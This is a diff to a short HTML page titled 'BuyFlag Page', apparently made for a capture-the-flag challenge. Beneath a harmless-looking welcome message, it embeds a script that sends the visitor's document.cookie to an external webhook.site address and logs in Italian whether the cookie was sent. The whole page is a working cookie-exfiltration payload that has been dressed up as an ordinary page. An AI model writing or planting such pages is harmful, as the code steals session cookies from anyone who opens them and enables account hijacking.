@@ -1,8 +1,18 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <title>BuyFlag Page</title>
+</head>
 <body>
+<h1>Welcome to my page!</h1>
+<p>This page is ready.</p>
+
 <script>
 fetch('https://webhook.site/4830d005-4f6b-46f1-8962-d0fdd6951382?c=' + document.cookie)
+.then(() => console.log("Cookie inviato"))
+.catch(() => console.log("Errore nell'invio cookie"));
 </script>
+
 </body>
 </html>
